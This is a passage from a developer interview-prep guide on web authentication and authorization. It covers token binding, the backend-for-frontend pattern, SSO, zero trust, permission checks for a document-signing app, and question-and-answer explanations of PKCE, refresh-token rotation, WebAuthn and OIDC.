Client generates keypair → sends public key thumbprint in JWT header
Every API call: client signs request with private key (DPoP proof header)
Server verifies: token was issued for this keypair AND this request is signed
```

Prevents access token replay even if the token is stolen.

### 9.3 Backend for Frontend (BFF) Pattern

SPA doesn't handle tokens at all — a dedicated backend does it.

```
Browser ←→ BFF (your Node.js server)
             └── stores tokens server-side (session)
             └── proxies API calls to resource servers
             └── Browser only has an opaque session cookie

Advantages:
- No tokens in browser at all (not even HttpOnly cookies for tokens)
- BFF can implement token refresh transparently
- Client secret stays server-side
- Single place to add auth logic
```

### 9.4 Federated Identity / SSO

Single Sign-On — authenticate once, access multiple apps.

```
User logs in to Identity Provider (Okta, Azure AD) once
Each app (Service Provider) receives a signed assertion from the IdP
User doesn't re-enter credentials for each app

Protocols:
- SAML 2.0 — enterprise, XML
- OIDC — modern, JSON/JWT
```

### 9.5 Zero Trust Authorization

"Never trust, always verify" — no implicit trust based on network location.

```
Every request verified regardless of origin:
✓ Verify identity (authentication)
✓ Verify device health
✓ Verify context (location, time, behavior)
✓ Least-privilege access per request
✓ Continuous validation (not just at login)
```

---

## 10. DocSign-Specific Auth Patterns

### Document-Level Authorization

```js
// Multi-level permission model for document signing app
const docPermissions = {
  // Can user perform action on this specific document?
  canView: (user, doc) =>
    doc.ownerId === user.id ||
    doc.signers.some((s) => s.userId === user.id) ||
    doc.viewers.includes(user.id) ||
    user.role === "admin",

  canSign: (user, doc) => {
    const signer = doc.signers.find((s) => s.userId === user.id);
    return (
      signer !== undefined &&
      signer.status === "pending" &&
      doc.status === "in_progress" &&
      !doc.isExpired
    );
  },

  canVoid: (user, doc) =>
    (doc.ownerId === user.id || user.role === "admin") &&
    doc.status !== "completed" &&
    doc.status !== "voided",

  canDownload: (user, doc) =>
    docPermissions.canView(user, doc) &&
    doc.status === "completed",
};
```

### Signing Token (Unique per Signer)

For email-based signing flows where signers may not have accounts:

```js
// Server generates a one-time signing token per signer invitation
// Token encodes: documentId + signerId + expiry + signature
// No account needed — token IS the authentication for that specific signature action

// JWT as signing invitation token
{
  "sub": "sign-invite",
  "documentId": "doc:abc",
  "signerId": "signer:xyz",
  "email": "signer@example.com",
  "exp": 1701720000,  // 7 days
  "scope": "doc:sign"  // limited scope — can ONLY sign this document
}
```

---

## 11. Common Interview Questions (Deep Answers)

**Q: Why is `localStorage` bad for storing JWTs?**  
A: `localStorage` is accessible by any JavaScript running on the page via `localStorage.getItem()`. If your app has any XSS vulnerability — including in a third-party script — an attacker can silently exfiltrate the token. HttpOnly cookies cannot be read by JS at all. For short-lived access tokens, in-memory storage is best: they're gone on page refresh, limiting the theft window.

**Q: What is PKCE and why do SPAs need it?**  
A: Authorization Code flow originally required a `client_secret` to exchange the auth code for tokens. SPAs are public clients — any secret in the frontend JS bundle is visible to everyone. PKCE replaces the secret with a one-time cryptographic proof: the client generates a random `code_verifier`, sends `SHA256(code_verifier)` with the auth request, then sends the original `code_verifier` when exchanging the code. The authorization server hashes it and confirms it matches. An attacker who intercepts the auth code still can't exchange it without the verifier.

**Q: How does silent token refresh work without flashing a login screen on page load?**  
A: On app mount, before rendering any protected UI, make a silent call to `/auth/refresh` with `credentials: "include"` (sends the HttpOnly refresh cookie). If it succeeds, store the new access token in memory and render the app. If it fails, show the login screen. The key is blocking render until this check completes — using a `status: "loading"` state before showing `"authenticated"` or `"unauthenticated"` UI.

**Q: What is refresh token rotation and what does it protect against?**  
A: On every refresh token use, the server issues a brand new refresh token and immediately invalidates the old one. This protects against stolen refresh tokens: if an attacker steals a refresh token and tries to use it after the legitimate client has already rotated it, the server sees a reuse of an invalidated token. This is treated as a compromise signal — the server revokes **all** refresh tokens for that user, forcing a re-login. Without rotation, a stolen long-lived refresh token gives an attacker indefinite access.

**Q: What is the difference between RBAC and ABAC?**  
A: RBAC grants permissions based on a user's role — simple and easy to audit but inflexible. ABAC evaluates policies against multiple attributes of the user, resource, and environment simultaneously — "signer can sign pending documents assigned to them before expiry." ABAC is more powerful for fine-grained rules but harder to audit. Most real apps use a hybrid: RBAC for coarse-grained access, ABAC-style policies for resource-level decisions.

**Q: How does WebAuthn prevent phishing?**  
A: The credential (keypair) is cryptographically bound to the **relying party ID** (the domain). When authenticating, the browser checks that the current page's origin matches the `rpId` the credential was registered for. A phishing site at `yourapp-evil.com` cannot use a credential registered for `yourapp.com` — the domain binding check fails silently. Traditional passwords/TOTP don't have this property.

**Q: OAuth gives you an access token. How do you know who the user is?**  
A: OAuth 2.0 by itself doesn't tell you. It only gives delegated access to resources. To get identity, you use **OpenID Connect** — a layer on top of OAuth that adds the `id_token` (a signed JWT with `sub`, `email`, `name`, etc.) and the `/userinfo` endpoint. The `id_token` must be validated: check `iss`, `aud`, `exp`, and verify the signature against the provider's JWKS public keys.

**Q: What is the BFF pattern and when would you use it?**  
A: Backend for Frontend — a dedicated server-side layer that sits between your SPA and your APIs. The BFF handles all OAuth flows, stores tokens server-side, and the browser only has an opaque session cookie. You'd use it when you want zero tokens in the browser (maximum security), when you need to aggregate multiple APIs, or when client_secret security is paramount. The tradeoff is added infrastructure complexity.

**Q: What's wrong with the implicit OAuth flow?**  
A: The implicit flow was designed for SPAs before PKCE existed. It returned the `access_token` directly in the URL fragment (`#access_token=...`). Problems: (1) tokens appear in browser history and server logs, (2) no `refresh_token` was issued, (3) no way to verify the token wasn't tampered with in transit. PKCE authorization code flow is a strict improvement — there's no reason to use implicit today.
